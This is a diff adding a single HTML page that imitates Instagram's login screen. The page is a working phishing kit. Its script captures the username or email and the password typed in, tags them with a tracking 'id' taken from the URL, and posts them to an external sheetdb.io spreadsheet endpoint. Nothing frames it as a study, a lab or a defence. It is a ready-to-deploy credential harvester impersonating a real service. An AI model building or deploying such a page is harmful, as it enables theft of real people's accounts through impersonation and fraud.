@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        width: 350px;
+        background: #fff;
+        border: 1px solid #dbdbdb;
+        padding: 40px;
+        border-radius: 8px;
+        text-align: center;
+    }
+
+    .logo img {
+        width: 180px;
+        margin-bottom: 30px;
+    }
+
+    input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 12px;
+        border: 1px solid #dbdbdb;
+        border-radius: 5px;
+        background: #fafafa;
+        font-size: 14px;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 10px;
+        background: #0095f6;
+        border: none;
+        border-radius: 5px;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+
+    .btn:hover {
+        background: #007ed4;
+    }
+
+    .or {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+        color: #999;
+    }
+
+    .or::before, .or::after {
+        content: "";
+        flex: 1;
+        height: 1px;
+        background: #dbdbdb;
+        margin: 0 10px;
+    }
+
+    .facebook-login {
+        color: #385185;
+        font-weight: bold;
+        cursor: pointer;
+        margin-bottom: 18px;
+    }
+
+    .forgot {
+        font-size: 13px;
+    }
+
+    .signup-box {
+        margin-top: 20px;
+        width: 350px;
+        text-align: center;
+        padding: 20px;
+        background: #fff;
+        border: 1px solid #dbdbdb;
+        border-radius: 8px;
+        font-size: 14px;
+    }
+
+    a {
+        text-decoration: none;
+        color: #0095f6;
+        font-weight: bold;
+    }
+</style>
+</head>
+<body>
+
+<div>
+    <div class="container">
+        <div class="logo">
+            <!-- Instagram logo -->
+            <h1>Instagram</h1>
+        </div>
+
+        <input id="email" type="text" placeholder="Phone number, username, or email">
+        <input id="password" type="password" placeholder="Password">
+
+        <button onclick="send()" class="btn">Log In</button>
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "instagram";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+        <div class="or">OR</div>
+
+        <div class="facebook-login">Log in with Facebook</div>
+
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+</body>
+</html>
